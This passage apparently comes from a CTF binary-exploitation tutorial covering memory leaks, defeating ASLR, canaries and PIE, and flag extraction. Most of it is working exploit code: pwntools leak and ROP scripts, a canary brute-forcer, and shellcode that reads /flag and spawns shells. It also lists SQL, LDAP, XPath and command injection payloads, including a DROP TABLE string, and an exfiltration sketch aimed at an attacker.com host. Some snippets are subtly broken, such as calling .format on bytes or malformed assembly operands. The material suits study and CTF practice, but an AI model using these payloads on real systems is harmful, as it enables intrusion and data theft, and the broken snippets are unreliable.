log.info(f"Leaked pointer: {hex(leaked_ptr)}")
```

**Stack Pointer Leak via argv/envp:**

```python
# Many binaries leak stack addresses through environment
# Exploit services that echo environment or command line

p.sendline(b"show_env")
env_output = p.recvuntil(b'\n')

# Environment variables are on stack
# Parse addresses from output
addrs = re.findall(b'0x[0-9a-f]{12}', env_output)
stack_leak = int(addrs[0], 16)
```

### Tools for Pointer Leak Identification

**ROPgadget with Leak Detection:**

```bash
# Find gadgets that leak pointers
ROPgadget --binary ./target --search "mov.*rdi.*|lea.*rdi"

# Common leak gadgets:
# pop rdi; ret  - control RDI for write() calls
# mov rdi, [rbp-0x8]; call rax  - indirect leaks
```

**pwntools Leak Utilities:**

```python
from pwn import *

context.binary = './target'
elf = ELF('./target')
p = process('./target')

# DynELF for automated leak exploitation
def leak(addr):
    # Custom leak function using vulnerability
    p.sendline(b"read %p" % addr)
    return p.recv(8)

d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
log.info(f"Resolved system: {hex(system_addr)}")
```

## Stack/Heap Address Leaks

Memory address leaks are critical for bypassing modern exploit mitigations. Different memory regions have distinct characteristics and exploitation approaches.

### Stack Address Leaks

**Direct Stack Leaks:**

```python
from pwn import *

p = process('./binary')

# Common leak vectors:
# 1. Format string reading stack
p.sendline(b"%p %p %p")
leaks = p.recvline().split()
stack_addr = int(leaks[0], 16)

# 2. Buffer over-read including stack frames
p.sendline(b'A' * 256)
response = p.recv(512)
# Parse for addresses (0x7fff... on x86-64 Linux)

# 3. Error messages with stack traces
p.sendline(b"trigger_error")
trace = p.recvuntil(b'\n')
# Extract addresses from backtrace
```

**Calculating Offsets from Stack Leak:**

```python
# Leaked stack address points to specific location
leaked_rsp = 0x7fffffffde50

# Calculate distance to target (saved RIP, buffer, etc.)
# Requires reverse engineering binary
target_offset = -0x20  # Example: 32 bytes before leak

target_addr = leaked_rsp + target_offset
log.info(f"Target at: {hex(target_addr)}")

# Construct payload using calculated address
payload = p64(target_addr) + shellcode
```

**Stack Pivot Exploitation:**

```python
# Use leaked stack address for stack pivot
# Required when exploiting from heap/bss

leaked_stack = 0x7fffffffdf00
fake_stack = leaked_stack - 0x200  # Create fake frame below

# ROP chain on fake stack
rop_chain = [
    pop_rdi,
    leaked_stack,  # Address of "/bin/sh" string placed on stack
    system_addr
]

# Pivot using leaked address
payload = b'A' * offset
payload += p64(pop_rsp) + p64(fake_stack)  # Stack pivot gadget
```

### Heap Address Leaks

**Freed Chunk Metadata:**

```c
// Heap chunks contain forward/back pointers when freed
// Exploitation: allocate, free, read without clearing

void *chunk = malloc(0x100);
free(chunk);
// chunk now contains heap metadata (fd/bk pointers)

read_from_user(chunk, 0x10);  // Over-read exposes fd pointer
```

**Exploitation Pattern:**

```python
from pwn import *

p = process('./heap_binary')

# Allocate multiple chunks
p.sendline(b"alloc 0 100")
p.sendline(b"alloc 1 100")
p.sendline(b"alloc 2 100")

# Free chunk (creates freed chunk metadata)
p.sendline(b"free 1")

# Read from freed chunk (leaks heap pointers)
p.sendline(b"show 1")
heap_leak_raw = p.recv(8)
heap_leak = u64(heap_leak_raw.ljust(8, b'\x00'))

log.success(f"Heap leak: {hex(heap_leak)}")

# Calculate heap base (chunk addresses have patterns)
# [Inference] Heap base is typically page-aligned
heap_base = heap_leak & ~0xfff
log.info(f"Heap base (inferred): {hex(heap_base)}")
```

**tcache/fastbin Leak Vectors:**

```python
# Modern glibc: tcache stores pointers in freed chunks
# Exploit: read tcache entries for heap layout

# Allocate/free to populate tcache
for i in range(7):  # tcache holds 7 chunks per size
    p.sendline(f"alloc {i} 64".encode())

for i in range(7):
    p.sendline(f"free {i}".encode())

# Read first freed chunk (contains next pointer)
p.sendline(b"show 0")
tcache_next = u64(p.recv(8).ljust(8, b'\x00'))

# tcache_next points to next freed chunk
log.info(f"Next tcache chunk: {hex(tcache_next)}")
```

### Defeating ASLR with Leaks

**Calculating Library Base:**

```python
# Leaked address from libc (e.g., from GOT)
leaked_puts = 0x7ffff7a649c0

# Find offset in libc
libc = ELF('./libc.so.6')
puts_offset = libc.symbols['puts']

# Calculate base
libc_base = leaked_puts - puts_offset
log.success(f"libc base: {hex(libc_base)}")

# Resolve other symbols
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

log.info(f"system: {hex(system)}")
log.info(f"/bin/sh: {hex(binsh)}")
```

**PIE Base Calculation:**

```python
# Leaked code address (e.g., from return address on stack)
leaked_code = 0x5555555551a9

# PIE binaries have randomized base, but internal offsets fixed
# Objdump to find offset of leaked location
# objdump -d binary | grep 51a9

# Example: leaked address is at offset 0x11a9
pie_base = leaked_code - 0x11a9
log.success(f"PIE base: {hex(pie_base)}")

# Calculate gadgets/functions
target_func = pie_base + 0x1234
```

### Advanced Leak Techniques

**Partial Overwrite Analysis:**

```python
# When ASLR limits change to lower bytes only
# Example: lower 12 bits not randomized on page-aligned addresses

# Leak reveals: 0x7ffff7a64???
# Last 3 nibbles (12 bits) constant across runs

# Brute force or partial overwrite exploitation
# Success rate: 1/16 for 4-bit brute force
```

**pwntools DynELF Usage:**

```python
# Automated symbol resolution via arbitrary read primitive

def leak_byte(addr):
    # Implement using your vulnerability
    # Must read single byte at arbitrary address
    payload = craft_read_payload(addr)
    p.send(payload)
    return u8(p.recv(1))

# DynELF uses leak to walk ELF structures
d = DynELF(leak_byte, pointer=leaked_addr, elf=ELF('./binary'))

# Automatically find symbols
system = d.lookup('system', 'libc')
log.success(f"Found system at: {hex(system)}")
```

**GDB Verification:**

```bash
gdb ./binary
gdb> b *main
gdb> r
# Leak address at runtime
gdb> p &buffer
# Verify leak matches GDB output

# Compare with leaked values from exploit
gdb> x/gx $rsp+0x10
# Confirms stack layout assumptions
```

### Important Considerations

[Inference] ASLR entropy varies by architecture:

- x86-64 Linux: 28 bits for mmap regions (stack/heap/libs)
- PIE: 28 bits for code
- Stack: ~28 bits but depends on kernel configuration

[Unverified] Some embedded systems and older kernels may have reduced ASLR entropy, making brute force viable. This requires testing against specific targets.

**Recommended Subtopics:**

- Heap exploitation techniques (tcache poisoning, fastbin attack)
- ROP chain construction after successful leaks
- Kernel address leaks (for privilege escalation contexts)

---

## Libc Base Address Identification

### Why Libc Leaks Matter

ASLR randomizes libc's base address at each execution. Knowing libc's base allows calculation of addresses for `system()`, one_gadgets, ROP gadgets, and the `__malloc_hook`/`__free_hook` tables.

### Leak Strategies

**Format String Vulnerabilities**

```bash
# Leak stack values that contain libc pointers
# Example: printf(user_input) where stack contains return addresses
python -c 'print("%p." * 20)' | ./vulnerable_binary

# Targeted leak at specific offset
python -c 'print("%7$p")' | ./vulnerable_binary
```

The stack typically contains return addresses pointing into libc's `__libc_start_main` or similar functions. These appear as addresses in the `0x7f...` range on 64-bit systems.

**Use-After-Free (UAF) Leaks**

```python
# Freed chunks in unsorted bin contain fd/bk pointers to main_arena
# Allocate chunk, free it, read it back without zeroing

from pwn import *

p = process('./binary')
# Allocate and free a chunk (size > 0x80 to enter unsorted bin)
p.sendline(b'malloc 0x100')  
p.sendline(b'free 0')
p.sendline(b'read 0')  # Read freed chunk content
leak = u64(p.recv(8))
```

Freed chunks in the unsorted bin contain forward/backward pointers to `main_arena+88` (offset varies by glibc version). Main_arena resides in libc's data segment.

**Buffer Over-read**

```c
// Vulnerable code: printf reads past buffer end
char buf[32];
read(0, buf, 32);  // No null terminator
printf(buf);       // Leaks stack data past buf
```

Exploit by sending exactly 32 bytes without newline, causing printf to continue reading stack memory.

### Calculating Libc Base

**Method 1: Known Function Offset**

```python
from pwn import *

# Leaked address from stack (e.g., __libc_start_main+231)
leaked_addr = 0x7ffff7a05b97

# Find offset using local libc or provided libc.so
libc = ELF('./libc.so.6')
libc_start_main_offset = libc.symbols['__libc_start_main']

# Calculate base (account for offset within function if known)
libc_base = leaked_addr - libc_start_main_offset - 231

# Now calculate any libc address
system_addr = libc_base + libc.symbols['system']
```

**Method 2: GOT Dereferencing**

```python
# If you can read arbitrary memory, read GOT entries
# GOT contains resolved libc addresses after first call

elf = ELF('./binary')
puts_got = elf.got['puts']

# Leak GOT entry (implementation depends on bug type)
leaked_puts = leak_memory(puts_got)

# Calculate base
libc = ELF('./libc.so.6')
libc_base = leaked_puts - libc.symbols['puts']
```

**Tools for Offset Identification**

```bash
# Find which libc function a leaked address belongs to
$ libc-database/find __libc_start_main_ret 0xb97

# Or use vmmap in gdb-peda/gef
gef➤ vmmap
# Compare leaked address to libc mapping range

# Identify libc version from leaked addresses
$ libc-database/identify puts 0x7f1234567890 read 0x7f1234abcdef
```

### Common Leak Sources

|Source|Typical Content|Leak Method|
|---|---|---|
|Stack|Return addresses, saved frame pointers|Format string, buffer over-read|
|Heap metadata|fd/bk pointers to main_arena|UAF, heap overflow read|
|GOT|Resolved libc function addresses|Arbitrary read primitive|
|FILE structure|Pointers to libc _IO_file_jumps|FILE leak + structure parsing|

## Canary Leaking

### Stack Canary Mechanics

Stack canaries are random 64-bit values (x86-64) placed between local variables and saved return address. The LSB is always `\x00` to prevent string function leaks [Inference: based on common implementation]. On fork-based servers, canaries remain constant across connections.

**Canary Location**

```
High addresses
+------------------+
| Return Address   |
+------------------+
| Saved RBP        |
+------------------+
| Canary (8 bytes) | ← fs:0x28 on x64
+------------------+
| Local Variables  |
+------------------+
Low addresses
```

### Leak Techniques

**Format String Leak**

```bash
# Canary typically at predictable stack offset
# Find offset with trial and error or gdb

# In gdb, find canary location
gef➤ canary
[+] The canary of process 1234 is at 0x7fffffffe428, value is 0xdeadbeef00000000

# Calculate format string offset
gef➤ telescope $rsp 50  # Examine stack
# Count positions to canary

# Exploit
python -c 'print("%13$p")' | ./binary  # If canary at 13th position
```

**Byte-by-Byte Bruteforce (Fork-based Services)**

```python
from pwn import *

def leak_canary():
    canary = b'\x00'  # LSB always null
    
    for i in range(1, 8):  # Leak 7 bytes
        for byte in range(256):
            p = remote('target', 1337)
            # Overflow up to canary + i bytes
            payload = b'A' * offset_to_canary + canary + bytes([byte])
            p.send(payload)
            response = p.recvall(timeout=1)
            
            if b'stack smashing detected' not in response:
                canary += bytes([byte])
                p.close()
                break
            p.close()
    
    return u64(canary)
```

**[Unverified]** This works because incorrect canary values trigger immediate termination, while correct partial values allow continuation. Requires fork() model where canary persists.

**Over-read Leak**

```c
// Vulnerable: reads buffer but includes canary in output
char buf[64];
read(0, buf, 64);
write(1, buf, 72);  // Writes past buffer, leaking canary
```

Exploit:

```python
from pwn import *

p = process('./binary')
p.send(b'A' * 64)  # Fill buffer to canary
leak = p.recv(72)
canary = u64(leak[64:72])
```

### Bypassing Without Leak

**Stack Pivot**: Redirect RSP before canary check occurs

```python
# Overwrite saved RBP to control RSP in function epilogue
# Function returns before canary check
```

**Overwrite __stack_chk_fail**: Replace canary fail handler in GOT

```python
# If you have arbitrary write
elf.got['__stack_chk_fail'] = win_function_addr
```

## PIE Base Calculation

### PIE Address Space Layout

PIE (Position Independent Executable) randomizes the binary's base address. On 64-bit Linux, PIE binaries load at randomized addresses like `0x555555554000` (12 bits entropy typical).

**Address Composition**

```
Leaked PIE address:     0x0000555555555169
PIE base:               0x0000555555554000  (page-aligned, ends in 000)
Offset within binary:   0x0000000000001169
```

### Leak Strategies

**Format String Leak of Code Pointers**

```bash
# Stack contains return addresses into main binary
python -c 'print("%p." * 30)' | ./pie_binary

# Look for addresses matching PIE range (0x555... on 64-bit)
# These are return addresses or saved instruction pointers
```

**Partial Overwrite Exploitation**

```python
# Without ASLR leak, overwrite least significant bytes only
# Example: Change return address from main+123 to win+0

payload = b'A' * offset
payload += p16(0x11ab)  # Overwrite 2 LSB to jump to win() offset
```

**[Inference]** This works because PIE randomizes only upper address bits, keeping lower 12 bits (page offset) constant.

**Saved Frame Pointer Leak**

```python
# RBP often points into stack, but code pointers point into .text
# Look for values in 0x555... range vs 0x7fff... range

# Leak via format string
payload = b'AAAA%11$p%12$p%13$p'  # Try multiple offsets
```

### Calculating PIE Base

```python
from pwn import *

# Leaked address from .text segment
leaked_addr = 0x555555555169

# Method 1: Mask to page boundary
pie_base = leaked_addr & ~0xfff  # Clear lower 12 bits
# Result: 0x555555555000

# Method 2: Subtract known offset
elf = ELF('./binary')
main_offset = elf.symbols['main']
if leaked_from_main:
    pie_base = leaked_addr - main_offset - known_instruction_offset

# Verify base is page-aligned
assert pie_base & 0xfff == 0, "PIE base must be page-aligned"

# Calculate target addresses
win_addr = pie_base + elf.symbols['win']
got_base = pie_base + elf.address  # For GOT entries
```

**Using pwntools Context**

```python
from pwn import *

elf = context.binary = ELF('./binary')

# After leaking an address
leaked_main = 0x555555555169
elf.address = leaked_main - elf.symbols['main']

# Now elf.symbols and elf.got automatically adjust
system_plt = elf.plt['system']  # Auto-calculated with PIE base
```

### Common PIE Leak Sources

|Source|Content|Reliability|
|---|---|---|
|Return addresses on stack|Points to caller function in .text|High|
|Saved RIP in signal frames|Points to interrupted instruction|High (if signals used)|
|.data section pointers|Function pointers in global variables|Medium (depends on binary)|
|Exception handling metadata|Stored in .eh_frame, contains .text refs|Low (complex parsing)|

## Building Leak Primitives

A leak primitive is a method to read arbitrary memory addresses repeatedly and reliably.

### Format String Leak Primitive

**Direct Parameter Access**

```python
def leak_format(addr, offset=6):
    """
    Leak 8 bytes at addr using format string at stack offset
    offset: position where our buffer appears on stack
    """
    from pwn import *
    
    payload = p64(addr)  # Address to leak
    payload += b'%{}$s'.format(offset)  # Read string at that address
    
    p.sendline(payload)
    leak = p.recvuntil(b'\n')
    
    # Parse output, extract data before newline
    return u64(leak[:8].ljust(8, b'\x00'))

# Usage
libc_leak = leak_format(elf.got['puts'])
```

**Positional Parameter Leak**

```python
def leak_stack_offset(offset):
    """Leak value at specific stack offset"""
    payload = f'%{offset}$p'.encode()
    p.sendline(payload)
    result = p.recvline()
    return int(result.strip(), 16)

# Scan for useful addresses
for i in range(1, 50):
    val = leak_stack_offset(i)
    print(f"Offset {i}: {hex(val)}")
```

### Arbitrary Read via Buffer Over-read

**Controlling Read Length**

```python
def leak_memory(addr, length):
    """
    Assumes vulnerability: read(0, buf, user_controlled_size)
                          write(1, buf, length)
    """
    # Prepare buffer to include target address
    payload = b'READ'  # Command
    payload += p32(length)  # How many bytes to read
    payload += p64(addr)  # Target address
    
    p.send(payload)
    return p.recv(length)
```

### Heap-Based Leak Primitive

**UAF Read Primitive**

```python
class HeapLeaker:
    def __init__(self, proc):
        self.p = proc
        self.freed_chunks = []
    
    def alloc(self, size):
        self.p.sendline(b'1')  # Allocate option
        self.p.sendline(str(size).encode())
        return int(self.p.recvline())  # Return chunk ID
    
    def free(self, idx):
        self.p.sendline(b'2')  # Free option
        self.p.sendline(str(idx).encode())
        self.freed_chunks.append(idx)
    
    def read_freed(self, idx):
        """Read freed chunk to leak fd/bk pointers"""
        self.p.sendline(b'3')  # Read option
        self.p.sendline(str(idx).encode())
        data = self.p.recvline()
        return u64(data[:8].ljust(8, b'\x00'))
    
    def leak_libc(self):
        # Allocate large chunk to avoid tcache
        idx = self.alloc(0x420)  
        self.free(idx)  # Goes to unsorted bin
        leak = self.read_freed(idx)  # Read fd pointer
        
        # Calculate libc base from main_arena
        libc_base = leak - 0x1ebbe0  # Offset to main_arena (version-specific)
        return libc_base
```

**[Unverified]** The offset `0x1ebbe0` is specific to glibc 2.31. Use `libc-database` or debugging to find the correct offset for your target version.

### GOT Dereferencing Primitive

**When You Have Arbitrary Write**

```python
def leak_via_got_overwrite(target_addr):
    """
    Overwrite printf GOT to point to puts, 
    then call printf with target_addr as argument
    """
    # Overwrite printf@got to puts@plt
    write_arbitrary(elf.got['printf'], elf.plt['puts'])
    
    # Call printf(target_addr) - actually calls puts(target_addr)
    trigger_printf(target_addr)
    return u64(p.recv(8))
```

### Partial Overwrite Leak Primitive

**Information Disclosure via Timing**

```python
def leak_byte_blind(addr, byte_pos):
    """
    Blind leak via partial overwrite + crash detection
    Only works if incorrect values cause crash
    """
    for guess in range(256):
        p = process('./binary')
        
        # Overwrite byte at addr with guess
        partial_overwrite(addr, byte_pos, guess)
        
        try:
            # If correct, program continues
            response = p.recv(timeout=2)
            p.close()
            return guess
        except:
            # Crash indicates wrong guess
            p.close()
            continue
```

**[Unverified]** This timing-based approach is unreliable and depends heavily on program behavior. Network latency and process scheduling affect accuracy.

### Building Multi-Stage Leaks

**Stage 1: Stack Leak → Stage 2: Libc Leak**

```python
# Stage 1: Leak stack address (for heap pointer or PIE)
stack_addr = leak_format_string('%3$p')

# Stage 2: Calculate heap location, leak heap metadata
heap_addr = calculate_from_stack(stack_addr)
libc_leak = read_heap_metadata(heap_addr)

# Stage 3: Calculate all addresses
libc_base = libc_leak - known_offset
system_addr = libc_base + libc.symbols['system']
```

### Tools for Leak Development

**pwntools Automation**

```python
from pwn import *

# Interactive leak helper
def leak_menu():
    """Drop to interactive shell for manual leak exploration"""
    p.interactive()

# Automated leak search
def find_libc_leak(max_offset=100):
    """Scan format string offsets for libc addresses"""
    for i in range(1, max_offset):
        try:
            val = leak_stack_offset(i)
            if 0x7f0000000000 < val < 0x7fffffffffff:  # Likely libc
                print(f"[+] Possible libc leak at offset {i}: {hex(val)}")
        except:
            continue
```

**GDB Scripting for Leak Verification**

```python
# gdb-gef script
gef➤ python
import gdb

def find_libc_refs():
    """Find all stack values pointing into libc"""
    rsp = gdb.parse_and_eval('$rsp')
    libc_base = gdb.execute('info proc mappings', to_string=True)
    # Parse and search stack for libc pointers
    
find_libc_refs()
end
```

### Leak Primitive Reliability Considerations

**Fork vs Thread Model**

- Fork-based: Each connection has identical memory layout (same ASLR values) until restart
- Thread-based: Shared address space, but threads may have different stack layouts
- [Inference] Fork model enables iterative exploitation; thread model may require one-shot leaks

**Partial RELRO Implications**

- Partial RELRO: GOT writable, leak via GOT overwrite possible
- Full RELRO: GOT read-only, must find alternative leak primitives

**Heap Leak Reliability**

- Tcache (glibc ≥2.26): Small chunks enter tcache, which has no fd/bk pointers to libc
- Solution: Allocate chunks >0x408 bytes to bypass tcache and reach unsorted bin
- [Unverified] Tcache max size is 0x408 by default but can be configured at compile time

### Practical Example: Multi-Stage Information Leak

```python
#!/usr/bin/env python3
from pwn import *

binary = './challenge'
elf = context.binary = ELF(binary)
libc = ELF('./libc.so.6')

def leak_stack():
    """Stage 1: Leak stack address for PIE calculation"""
    p.sendlineafter(b'> ', b'%15$p')  # Leak saved RIP
    leak = int(p.recvline().strip(), 16)
    elf.address = leak - elf.symbols['main'] - 0x123  # Adjust offset
    log.success(f"PIE base: {hex(elf.address)}")
    return elf.address

def leak_libc():
    """Stage 2: Leak libc via GOT"""
    # Use our arbitrary read to dump puts@got
    read_primitive(elf.got['puts'])
    puts_leak = u64(p.recv(8))
    libc.address = puts_leak - libc.symbols['puts']
    log.success(f"Libc base: {hex(libc.address)}")
    return libc.address

def leak_canary():
    """Stage 3: Leak stack canary"""
    p.sendlineafter(b'> ', b'%17$p')  # Canary position
    canary = int(p.recvline().strip(), 16)
    log.success(f"Canary: {hex(canary)}")
    return canary

# Execute leak chain
p = process(binary)
pie_base = leak_stack()
libc_base = leak_libc()
canary = leak_canary()

# Now we have all addresses for final exploit
# ...
```

### Important Caveats

**ASLR Entropy Limits**

- 32-bit: ~8 bits entropy (brute-forceable)
- 64-bit: ~28 bits for mmap, ~8 bits PIE [Inference: based on typical kernel configurations]
- [Unverified] Entropy varies by kernel version and system configuration

**Leak Timing Considerations**

- Leaks must occur before target addresses are used in exploit
- Multi-round protocols allow staged leaks
- Single-shot exploits require parallel information disclosure or known offsets

**Leak Validation** Always validate leaked addresses:

```python
def validate_leak(addr, expected_range):
    """Check if leaked address is plausible"""
    if expected_range == 'libc':
        return 0x7f0000000000 < addr < 0x7fffffffffff
    elif expected_range == 'pie':
        return 0x555555554000 < addr < 0x555555600000
    elif expected_range == 'stack':
        return 0x7ffffffde000 < addr < 0x7ffffffff000
    return False
```

**Related Topics for Further Study**: Return-Oriented Programming (ROP) chain construction, heap exploitation primitives, format string exploitation advanced techniques, ASLR bypass methodologies

---

# CTF-Specific Techniques

## Flag Extraction Strategies

Flag extraction requires identifying where flags are stored, accessing them despite protections, and reliably retrieving data from exploited systems.

**Common flag locations**

```
/flag           ; Root directory
/flag.txt       ; Text file
/tmp/flag       ; Temp directory
/root/flag      ; Root home
~/flag          ; User home
/proc/flag      ; Proc filesystem
Environment variables
Hardcoded in binary
Database
Web server document root
```

**Flag identification patterns**

Most CTF flags follow patterns:

```
flag{...}
CTF{...}
FLAG{...}
ctf{...}
picoCTF{...}
FLAG-...
FLAG_...
flag_...
```

**Reading flag via arbitrary read**

Format string vulnerability enabling memory read:

```python
from pwn import *

p = process('./service')

# Leak stack to find flag pointer
payload = b'%p.%p.%p.%p.%p'
p.send(payload)
leak = p.recv(1024)

# Leak actual flag
payload = b'%s' + p64(flag_addr)
p.send(payload)
flag = p.recv(1024)
```

**Buffer overflow to read flag**

Overflow into GOT/memory containing flag:

```python
# If flag at known address, overflow return address
# to function that prints flag

offset = 40
payload = b'A' * offset
payload += p64(print_flag_function)

p = process('./service')
p.send(payload)
flag_output = p.recv(1024)
```

**File descriptor hijacking**

Redirect file descriptors to capture flag:

```python
# Shellcode redirecting flag file to stdout
shellcode = asm("""
    mov rax, 2              ; open syscall
    lea rdi, [rel flag_path]
    xor rsi, rsi
    syscall
    
    mov rdi, rax            ; fd = opened file
    mov rsi, 1              ; stdout
    mov rax, 33             ; dup2 syscall
    syscall
    
    mov rax, 1              ; write syscall
    mov rdi, 1              ; stdout
    lea rsi, [rel buffer]
    mov rdx, 100
    syscall
""")
```

**SQL injection for flag extraction**

Database-stored flags:

```sql
' UNION SELECT flag FROM flags; --
' UNION SELECT GROUP_CONCAT(flag) FROM flags; --
'; DROP TABLE users; --
' OR '1'='1
```

Python execution:

```python
import sqlite3

# Read flag from database
conn = sqlite3.connect(':memory:')
cursor = conn.cursor()
cursor.execute("SELECT flag FROM flags")
flag = cursor.fetchone()[0]
print(flag)
```

**Command injection flag extraction**

Vulnerable command execution:

```bash
# Payload: `cat /flag`
# Binary: system(user_input)

payload = "test; cat /flag; echo"
```

Automation:

```python
from pwn import *

p = process('./vulnerable_service')
p.send(b'test; cat /flag; echo')
output = p.recv(1024)
flag = extract_flag(output)
```

**XPath/XML injection**

```xml
' or 'a'='a
//flag[text()='*']
//*[local-name()='flag']
```

**LDAP injection**

```
*)(|(uid=*
admin*)(|(password=*
```

**XPATH/XML extraction:**

```python
from lxml import etree

# Parse XML response
root = etree.fromstring(response_xml)
flags = root.xpath('//flag/text()')
for flag in flags:
    print(flag)
```

**Memory search for flag pattern**

Scan memory for flag-like strings:

```python
import re

# Dump process memory
memory_dump = read_process_memory()

# Search for flag pattern
flag_pattern = rb'flag\{[^}]+\}'
matches = re.findall(flag_pattern, memory_dump)

for match in matches:
    print(match)
```

**GDB-based flag extraction**

```bash
gdb ./binary
(gdb) break main
(gdb) run
(gdb) search -t bytes "flag"
(gdb) x/s found_address
```

**Heap spray flag extraction**

Force flag into predictable memory location:

```python
# Allocate many objects to fill heap
for i in range(1000):
    p.send(b'X' * 0x1000)

# Overflow into flag location
p.send(overflow_payload)
```

**Privilege escalation to read flag**

Escalate to root for protected flags:

```python
# Exploit local privilege escalation
# Then read /root/flag

shellcode = asm("""
    ; Privilege escalation code
    ; ...
    
    ; Open and read flag
    mov rax, 2
    lea rdi, [rel /root/flag]
    syscall
""")
```

**Timing-based flag extraction**

Time-based blind extraction:

```python
import time

flag = ""
for char_pos in range(100):
    for char_val in range(256):
        start = time.time()
        
        # Payload checking if flag[char_pos] == char_val
        payload = f"SELECT * FROM flags WHERE SUBSTR(flag, {char_pos}, 1) = '{chr(char_val)}'".encode()
        p.send(payload)
        
        elapsed = time.time() - start
        
        # If query takes longer (match), character found
        if elapsed > threshold:
            flag += chr(char_val)
            print(f"Found: {flag}")
            break
```

**Side-channel based flag recovery**

Cache timing side-channels:

```python
# Measure execution time for character guess
times = []
for char_val in range(256):
    payload = build_payload_checking_char(char_val)
    
    start = time.perf_counter()
    p.send(payload)
    result = p.recv(1024)
    elapsed = time.perf_counter() - start
    
    times.append((chr(char_val), elapsed))

# Correct character typically slowest (cache hit)
correct_char = max(times, key=lambda x: x[1])[0]
```

**Blind flag extraction (no output)**

Blind exploitation writing flag to accessible location:

```python
# Write flag to /tmp/flag_output
shellcode = asm("""
    mov rax, 2
    lea rdi, [rel /flag]
    xor rsi, rsi
    syscall
    
    mov r8, rax          ; fd = opened file
    
    mov rax, 2
    lea rdi, [rel /tmp/flag_output]
    mov rsi, 0x601      ; O_WRONLY | O_CREAT
    mov rdx, 0o644
    syscall
    
    mov rdi, rax        ; dest fd
    mov rsi, r8         ; source fd
    mov rax, 40         ; sendfile
    mov rdx, 0x1000
    syscall
""")

# Now read /tmp/flag_output from web server or out-of-band channel
```

**Out-of-band flag exfiltration**

Extract flag through separate channel:

```python
# DNS exfiltration
shellcode = asm(f"""
    ; Resolve flag-data-1.attacker.com
    ; Each DNS query contains partial flag data
""")

# HTTP exfiltration
shellcode = asm(f"""
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    syscall
    
    mov rdi, rax
    lea rsi, [rel connect_struct]
    mov rdx, 16
    mov rax, 42
    syscall
    
    lea rsi, [rel http_request]
    mov rdx, sizeof_request
    mov rax, 1
    syscall
""")
```

**Monitoring flag access**

Use debugger/strace to watch flag reads:

```bash
strace -e openat,read -f ./service 2>&1 | grep flag
# Shows when flag accessed

gdb ./service
(gdb) watch flag_variable
(gdb) run
# Stops when flag read/written
```

**Practice: Multi-stage flag extraction**

```python
from pwn import *

p = process('./service')

# Stage 1: Leak addresses via format string
p.send(b'%p.%p.%p.%p.%p')
leak = p.recv(1024)
addresses = parse_leak(leak)

# Stage 2: Overflow with shellcode
shellcode = asm(shellcraft.sh())
payload = shellcode + b'\x00' * (40 - len(shellcode))
payload += p64(addresses['stack_addr'])

p.send(payload)

# Stage 3: Read flag from spawned shell
p.send(b'cat /flag\n')
flag = p.recv(1024)
print(flag)
```

---

## Service Interaction Automation

Automating service interaction enables reliable exploitation of networked services, handling protocol variations, and managing timeouts.

**Basic service connection**

```python
from pwn import *

# TCP connection
s = remote('example.com', 4444)

# Send data
s.send(b'request')

# Receive data
response = s.recv(1024)

# Close
s.close()
```

**Handling timeouts**

```python
from pwn import *

try:
    s = remote('example.com', 4444, timeout=5)
    s.send(b'data')
    response = s.recv(1024, timeout=2)
except socket.timeout:
    print("Connection timeout")
except ConnectionRefusedError:
    print("Connection refused")
```

**Line-based protocol handling**

```python
s = remote('example.com', 4444)

# Send line
s.sendline(b'command')

# Receive until newline
response = s.recvline()

# Receive until string
s.recvuntil(b'>')

# Receive n bytes
s.recv(256)
```

**Protocol parsing**

Parse service responses:

```python
def parse_response(response):
    """Extract flag from service response"""
    lines = response.split(b'\n')
    for line in lines:
        if b'flag' in line.lower():
            return line.split(b':')[1].strip()
    return None

s = remote('example.com', 4444)
s.send(b'get_flag')
response = s.recv(4096)
flag = parse_response(response)
```

**Multi-round interaction**

```python
s = remote('example.com', 4444)

# Round 1: Authentication
s.send(b'AUTH username password\n')
response = s.recv(1024)
if b'OK' not in response:
    print("Auth failed")

# Round 2: Request data
s.send(b'GET_FLAG\n')
flag_response = s.recv(1024)

# Round 3: Logout
s.send(b'QUIT\n')
s.close()
```

**Pipelined requests**

Send multiple requests before reading:

```python
s = remote('example.com', 4444)

# Send multiple commands
s.send(b'COMMAND1\n')
s.send(b'COMMAND2\n')
s.send(b'COMMAND3\n')

# Read all responses
response1 = s.recvline()
response2 = s.recvline()
response3 = s.recvline()
```

**Binary protocol handling**

```python
s = remote('example.com', 4444)

# Send binary data
payload = p64(0x1234567890abcdef)
payload += p32(0xdeadbeef)
s.send(payload)

# Receive binary data
response = s.recv(16)
value1 = u64(response[:8])
value2 = u32(response[8:12])
```

**State machine implementation**

```python
class ServiceClient:
    def __init__(self, host, port):
        self.s = remote(host, port)
        self.state = 'INIT'
    
    def handshake(self):
        self.s.send(b'HELLO\n')
        response = self.s.recvline()
        self.state = 'AUTH_REQUIRED'
        return response
    
    def authenticate(self, user, passwd):
        payload = f'AUTH {user} {passwd}\n'.encode()
        self.s.send(payload)
        response = self.s.recvline()
        if b'OK' in response:
            self.state = 'AUTHENTICATED'
        return response
    
    def get_flag(self):
        self.s.send(b'GET_FLAG\n')
        flag = self.s.recv(1024)
        return flag

client = ServiceClient('example.com', 4444)
client.handshake()
client.authenticate('user', 'pass')
flag = client.get_flag()
```

**Interactive session mode**

```python
s = remote('example.com', 4444)
s.interactive()  # User can type commands directly
```

**Buffered I/O**

```python
s = remote('example.com', 4444)

# Automatic buffering
s.send(b'data1')
s.send(b'data2')
s.send(b'data3')

# Read everything
all_data = b''
while True:
    try:
        chunk = s.recv(1024, timeout=1)
        if not chunk:
            break
        all_data += chunk
    except socket.timeout:
        break
```

**Keepalive and connection management**

```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
s.connect(('example.com', 4444))

# TCP keepalive on Linux
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 120)
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 30)
s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 5)
```

**SSL/TLS connections**

```python
import ssl

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
context = ssl.create_default_context()
with context.wrap_socket(s, server_hostname='example.com') as ssock:
    ssock.connect(('example.com', 443))
    ssock.send(b'GET / HTTP/1.0\r\n\r\n')
    response = ssock.recv(4096)
```

**Pwntools SSL support**

```python
from pwn import *

s = remote('example.com', 443, ssl=True)
